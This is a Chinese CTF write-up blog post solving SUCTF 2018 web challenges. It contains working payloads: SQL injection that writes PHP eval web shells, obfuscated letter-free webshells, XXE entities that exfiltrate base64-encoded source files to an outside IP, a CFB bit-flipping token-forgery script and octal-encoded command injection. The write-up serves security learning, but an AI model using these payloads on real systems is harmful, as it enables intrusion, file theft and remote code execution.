<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>suctf2018刷题记录 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">suctf2018刷题记录</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="search"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">suctf2018刷题记录</h1><div class="post-meta"><a href="/2020/04/01/suctf2018刷题记录/#comments" class="comment-count"></a><p><span class="date">Apr 01, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Hits</i></i></span></p></div><div class="post-content"><p><a href="http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">http://www.bendawang.site/2018/05/28/SUCTF-2018-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</a><br><a href="https://www.xctf.org.cn/library/details/2ff21f569a791e21cbd6ce0d4675a9de5ec2373a/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/2ff21f569a791e21cbd6ce0d4675a9de5ec2373a/</a></p>
<h2 id="MultiSQL"><a href="#MultiSQL" class="headerlink" title="MultiSQL"></a>MultiSQL</h2><p>在user/user.php?id=1 处存在注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读index.php</span><br><span class="line">?id=6^(<span class="keyword">if</span>(ascii(mid(load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870),1,2))&gt;1,0,1))</span><br></pre></td></tr></table></figure></p>
<p>发现是用mysqli_multi_query()函数进行sql语句查询所以存在堆叠注入（其实这里题目名字也不难猜到是个堆叠注入）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php eval($_POST[1]);?&gt;'</span> into outfile <span class="string">'/var/www/html/favicon/3.php'</span>;</span><br><span class="line">;<span class="built_in">set</span> @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(101),CHAR(118),CHAR(97),CHAR(108),CHAR(40),CHAR(36),CHAR(95),CHAR(80),CHAR(79),CHAR(83),CHAR(84),CHAR(91),CHAR(49),CHAR(93),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(51),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59)); PREPARE s2 FROM @s; EXECUTE s2;</span><br></pre></td></tr></table></figure></p>
<p>非预期解 二次注入 select * from xxx where username = ‘用户名’<br>注册两个个账号用户名为 这里师傅经过测试username是60位，所有这里对shell进行了缩写<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php `<span class="variable">$_GET</span>[a]`;?&gt;</span><br><span class="line">&lt;?php `<span class="variable">$_GET</span>[a]`;?&gt;<span class="string">'into outfile'</span>/var/www/html/favicon/5.php</span><br></pre></td></tr></table></figure></p>
<p>这种方法没有成功，用第一种方法getshell之后去看一下源码<br><img src="/images/suctf2018-sql1.png" alt><br>二次注入点在user.php SESSION[‘user_name’]，回到login.php看SESSION的赋值<br><img src="/images/suctf2018-sql2.png" alt><br>这里直接用了查询出来的数据，是存在二次注入的，但是user.php会先判断存不存在user_id，不存在的话才会执行sql语句造成二次注入<br>这两个值是同时赋值的，不可能只存在一个感觉buu上改了源码233</p>
<h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"function SUCTF_<span class="variable">$hash</span>()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">"func_name"</span>]();</span><br><span class="line">    die();</span><br></pre></td></tr></table></figure>
<p>create_function创建的是匿名函数 匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数<br><img src="./images/suctf2018-anonymous.png" alt></p>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,5);</span><br><span class="line">    foreach (<span class="variable">$black_char</span> as <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            die(<span class="string">"illegal char"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤shell内容，fuzz出可用字符 ~ $ _ ; = ( )以及非英文字符<br>想到p神的无字符getshell，我自己写了一个<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(~<span class="string">'assert'</span>);</span><br><span class="line"><span class="variable">$b</span>=(~<span class="string">"_POST"</span>);</span><br><span class="line"><span class="variable">$c</span>=(~<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="string">'&lt;?php'</span>.<span class="string">"\r\n"</span>.<span class="string">'$_='</span>.<span class="variable">$b</span>.<span class="string">';'</span>.<span class="string">"\r\n"</span>.<span class="string">'$_=(~$_)'</span>.<span class="string">";\r\n"</span>.<span class="string">'(~'</span>.<span class="variable">$a</span>.<span class="string">')($$_[__]);'</span>;</span><br><span class="line">file_put_contents(<span class="string">'cop.php'</span>,<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure></p>
<p>别的师傅的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>==<span class="variable">$__</span>);</span><br><span class="line"><span class="variable">$__</span>=(<span class="variable">$_</span>==<span class="variable">$_</span>);</span><br><span class="line"><span class="variable">$___</span>=[~垂][<span class="variable">$_</span>][<span class="variable">$__</span>].[~匀][<span class="variable">$_</span>][<span class="variable">$__</span>].[~匀][<span class="variable">$_</span>][<span class="variable">$__</span>].[~嚅][<span class="variable">$_</span>][<span class="variable">$__</span>].[~捂][<span class="variable">$_</span>][<span class="variable">$__</span>].[~狂][<span class="variable">$_</span>][<span class="variable">$__</span>];</span><br><span class="line"><span class="variable">$____</span>=[~堂][<span class="variable">$_</span>][<span class="variable">$__</span>].[~寂][<span class="variable">$_</span>][<span class="variable">$__</span>].[~封][<span class="variable">$_</span>][<span class="variable">$__</span>].[~嬉][<span class="variable">$_</span>][<span class="variable">$__</span>].[~立][<span class="variable">$_</span>][<span class="variable">$__</span>];</span><br><span class="line"><span class="variable">$___</span>([$<span class="variable">$____</span>][<span class="variable">$_</span>][____________________________________]);</span><br><span class="line">//assert(<span class="variable">$_POST</span>[____________________________________]);</span><br></pre></td></tr></table></figure></p>
<p>在php7中 assert变得和eval一样，是一个语言结构，不能用可变函数调用，本地测试了一下7.0还是没变的，7.1+就和eval一样了<br>根目录下假的flag搞人心态，flag在环境变量里，env命令调出全部环境变量</p>
<h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h2><p><a href="https://xz.aliyun.com/t/6502" target="_blank" rel="noopener">https://xz.aliyun.com/t/6502</a><br>开始先是个xxe，xxe我只会用payload 233，看了上面那个文章也算是明白一点了<br>1.xml<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM <span class="string">"http://174.1.189.112/2.xml"</span>&gt;</span><br><span class="line">    %remote; %intern; %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
<p>2.xml<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=index.php"</span>&gt;</span><br><span class="line">&lt;!ENTITY % intern <span class="string">"&lt;!ENTITY &amp;#37; xxe SYSTEM 'http://174.1.189.112:2333/?%payl;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>问了哲哥合并成一个文件也是可以的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % payl SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=index.php"</span>&gt;</span><br><span class="line">    &lt;!ENTITY % intern <span class="string">"&lt;!ENTITY &amp;#37; xxe SYSTEM 'http://174.1.189.112:2333/?%payl;'&gt;"</span>&gt;</span><br><span class="line">    %intern; %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
<p>但是这个没有成功收到请求，可能是有啥过滤（小声逼逼感觉没有过滤但是又不知道哪错了）<br>submit 文件的时候post了一个sign,存到了数据库里<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(strrpos(w_addslashes(<span class="variable">$_POST</span>[<span class="string">'sig'</span>]),<span class="string">")"</span>)?<span class="string">""</span>:w_addslashes(<span class="variable">$_POST</span>[<span class="string">'sig'</span>]))</span><br></pre></td></tr></table></figure></p>
<p>show.php直接用了从库里查出来的sign 造成二次注入，触发的话要用xxe进行ssrf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'action'</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">'action'</span>]==<span class="string">"view"</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">"REMOTE_ADDR"</span>]!==<span class="string">"127.0.0.1"</span>) die(<span class="string">"Forbidden."</span>);</span><br><span class="line">	<span class="keyword">if</span>(!empty(<span class="variable">$_GET</span>[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">		<span class="variable">$file_info</span>=sql_result(<span class="string">"select * from file where filename='"</span>.w_addslashes(<span class="variable">$_GET</span>[<span class="string">'filename'</span>]).<span class="string">"'"</span>,<span class="variable">$mysql</span>);</span><br><span class="line">		<span class="variable">$file_name</span>=<span class="variable">$file_info</span>[<span class="string">'0'</span>][<span class="string">'2'</span>];</span><br><span class="line">		<span class="built_in">echo</span>(<span class="string">"file code: "</span>.file_get_contents(<span class="string">"./upload/"</span>.<span class="variable">$file_name</span>.<span class="string">".txt"</span>));</span><br><span class="line">		<span class="variable">$new_sig</span>=mt_rand();</span><br><span class="line">		sql_result(<span class="string">"update file set sig='"</span>.intval(<span class="variable">$new_sig</span>).<span class="string">"' where id="</span>.<span class="variable">$file_info</span>[<span class="string">'0'</span>][<span class="string">'0'</span>].<span class="string">" and sig='"</span>.<span class="variable">$file_info</span>[<span class="string">'0'</span>][<span class="string">'3'</span>].<span class="string">"'"</span>,<span class="variable">$mysql</span>);</span><br><span class="line">		die(<span class="string">"&lt;br&gt;new sig:"</span>.<span class="variable">$new_sig</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		die(<span class="string">"Null filename"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.xml改为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=http://localhost/show.php?action=view&amp;filename=1.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % intern <span class="string">"&lt;!ENTITY &amp;#37; xxe SYSTEM 'http://174.1.189.112:2333/?%payl;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>注入payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||'</span></span><br><span class="line">0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27</span><br></pre></td></tr></table></figure></p>
<p>不知道为啥png文件就是访问不到，刚开始我还以为是&amp;符号的问题，后来换个其他后缀就可以了，玄学，flag太长最后加个reverse读flag</p>
<h2 id="HateIT"><a href="#HateIT" class="headerlink" title="HateIT"></a>HateIT</h2><p><a href="http://www.lovei.org/archives/suctf2018.html" target="_blank" rel="noopener">http://www.lovei.org/archives/suctf2018.html</a><br><a href="https://blog.csdn.net/a3320315/article/details/104365345" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104365345</a><br><a href="https://www.anquanke.com/post/id/146419#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/146419#h3-5</a><br>git泄露，但是源码是加密的 <a href="http://php.net/manual/zh/internals2.opcodes.list.php" target="_blank" rel="noopener">Zend Engine 2 操作码列表</a> opcode照着操作码逆<br>robots.txt提示suenc.so 逆so文件得admin.php 源代码上面博客都有<br>第一步是伪造admin，有两个方法,源码中泄露了key，直接运行一下就行了，要在linux环境运行，win和linux生成随机数有差异<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=<span class="string">'bendawang'</span>;</span><br><span class="line"><span class="variable">$md5</span>=md5(get_identify().<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$admin</span>=3;</span><br><span class="line"><span class="variable">$token</span>=encrypt(<span class="variable">$username</span>.<span class="string">"|"</span>.<span class="variable">$admin</span>.<span class="string">"|"</span>.<span class="variable">$md5</span>);</span><br><span class="line"><span class="built_in">print</span> <span class="variable">$md5</span>.<span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">print</span> <span class="variable">$token</span>.<span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure></p>
<p>这个方法我没有成功233，所有有了第二种，cfb重放攻击，cfb解密得时候改变一组密文会影响这一组和下一组得解密结果，其他不影响<br>参见 <a href="https://xz.aliyun.com/t/4552#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4552#toc-3</a> ,附上一位师傅的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from os import urandom</span><br><span class="line">from Crypto.Util.strxor import strxor</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">plain = <span class="string">'xxxxxxxxxxxxxxx|0|d30ef4a963f6cadc8a453977ccbbc626'</span>  <span class="comment"># 最原始的明文</span></span><br><span class="line">token = <span class="string">'ZjVhYWI3NjA3ZTZiOGM4Y2YyMWUxOTRiNzhiMzFmNzkwYjYyMjAzYjZlZTgxMDAwNTY0ZDMyNzlkYTFiODk3YmQ1MDFiYjk2NzkyYmJhMzgwYzQ4OTgzMTlhYWQ5Nzk0OGExOGEwM2VkZDU4NjIwYzdhMTIxNmQ1ODY2OWI3YzM='</span>    <span class="comment">#对应的密文</span></span><br><span class="line">token = base64.b64decode(token)</span><br><span class="line">cipher = token.decode(<span class="string">"hex"</span>)</span><br><span class="line">ct = cipher[:16]+strxor(strxor(cipher[16:50], <span class="string">'0'</span>*34), <span class="string">'3'</span>*34)+cipher			<span class="comment"># 我们从第17个字符改，即0，改的长度为34，则后面的异或的长度也必须是34，而且第一个异或的值必须明文第十七的字符，第二个异或是我们想要更改的第一个值，由于admin要求是3，所以我们填3就行，最后我们+cipher是拓展我们的token，这样我们就更改了0|d30ef4a963f6cadc8a453977ccbbc626，下一组密文也是乱码即xxxxxxxxxxxxxxx|，这样剩下的一个0无关影响，因为我们只剩下两个||，刚好符合要求~~</span></span><br><span class="line">ct =  <span class="string">""</span>.join(ct).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ct))</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「HyyMbb」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/a3320315/java/article/details/104365345</span><br></pre></td></tr></table></figure></p>
<p>中间部分不怎么理解为啥加34位，改成16位就比较好理解了，前十六位是xxxxxxxxxxxxxxx| 中间填充16位解密结果是0后面15位乱码<br>然后这16位影响下面 xxxxxxxxxxxxxxx|的解密，被解密成乱码了，后面不影响 还是 0|d30ef4a963f6cadc8a453977ccbbc626<br>解密结果是 xxxxxxxxxxxxxxx|3+乱码+0|d30ef4a963f6cadc8a453977ccbbc626</p>
<p>第二步是rce 也有两种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">createThumbnail</span></span>()&#123;</span><br><span class="line">    <span class="variable">$e</span> = stripcslashes(preg_replace(<span class="string">'/[^0-9\\\]/'</span>,<span class="string">''</span>,isset(<span class="variable">$_GET</span>[<span class="string">'size'</span>])?<span class="variable">$_GET</span>[<span class="string">'size'</span>]:25));</span><br><span class="line">    system(<span class="string">"/usr/bin/convert &#123;<span class="variable">$this</span>-&gt;filename&#125; --resize <span class="variable">$e</span> ./thumbs/&#123;<span class="variable">$this</span>-&gt;filename&#125;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>size用八进制传输命令 admin.php?action=viewImage&amp;size=7315416373，即:;ls;</p>
<p>filename是可控的 直接admin.php?action=viewImage&amp;file=;ls 也可</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刷了三天终于刷完了，学到的东西还是很多</p>
</div><div class="post-copyright"><blockquote><p>Original author: cop</p><p>Original link: <a href="http://yoursite.com/2020/04/01/suctf2018刷题记录/">http://yoursite.com/2020/04/01/suctf2018刷题记录/</a></p><p>Copyright Notice: Please indicate the source of the reprint (must retain the author's signature and link)</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>Share:</span></div></div><div class="post-nav"><a href="/2020/03/29/初识pickle反序列化/" class="next">初识pickle反序列化</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Contents</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MultiSQL"><span class="toc-text">MultiSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Anonymous"><span class="toc-text">Anonymous</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Homework"><span class="toc-text">Homework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HateIT"><span class="toc-text">HateIT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/01/suctf2018刷题记录/">suctf2018刷题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/29/初识pickle反序列化/">初识pickle反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/11/MySQL服务端恶意读取客户端文件漏洞/">MySQL服务端恶意读取客户端文件漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/09/xctf3月赛/">xctf3月赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/05/De1CTF-2019刷题记录/">De1CTF-2019刷题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/01/2.29考核赛/">2.29考核赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/28/RoarCTF 2019/">RoarCTF 2019</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/26/安恒2.26月赛/">安恒2.26月赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/25/从GYCTF的两道题中学习node/">从GYCTF的两道题中学习node</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/24/2020GYCTF/">2020GYCTF</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archive</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Site Map</a> |  <a href="/atom.xml">Subscribe to this site</a> |  <a href="/about/">Contact the blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">cop.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body></html>